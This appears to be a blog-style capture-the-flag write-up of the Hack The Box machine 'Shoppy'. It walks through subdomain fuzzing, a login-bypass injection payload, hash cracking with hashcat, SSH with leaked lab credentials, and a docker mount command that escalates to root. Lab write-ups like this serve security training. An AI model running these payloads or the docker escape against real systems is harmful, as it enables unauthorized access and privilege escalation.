---
title: Shoppy Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

# Enumeration

If we fuzz the subdomains, we find the following:
```shell
wfuzz -c -f subdomains.txt -w /home/viksant/Desktop/hosts.txt -u "http://shoppy.htb/" -H "Host: FUZZ.shoppy.htb" --hl 7
```
```
==============================================================
ID Response Lines Word Chars Payload                                                                                                                                                                                  
==============================================================
000047340: 200 0 L 141 W 3122 Ch "mattermost"  
```

so let's add it to etc/hosts

# User exploit
We can bypass the login panel:
```sql
||' or 1==1
```

Once inside the page we see that we have a user search engine, and if we search for the user "admin" it reports us a downloadable with its user and encrypted password.

If we enter the same payload in the search bar, it shows us the user josh and his encrypted password, so we are going to use hashcat:

```shell
hashcat -a 0 -m 0 ./hash.txt /usr/share/wordlists/rockyou.txt
```

and we get the password `remembermethisway`. 

With this login, we are going to enter the subdomain.
Inside the page, we find the following credentials: 
`jaeger:Sh0ppyBest@pp!` so we use them to connect via SSH.

# Root exploit

if we do sudo -l we can see that we can execute the following command as deploy:
```shell
(deploy) /home/deploy/password-manager

sudo -u deploy ./password-manager // to run the script
```

If we take a better look, with `cat password-manager` we can see how we have a password: `Sample`. If we put it when it asks for master password, it gives us another password: `Deploying@pp!` which allows us to connect to deploy via ssh. 
Once inside, knowing that we are inside a docker, we can escalate privileges using the following command:

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

and we can see the root flag.

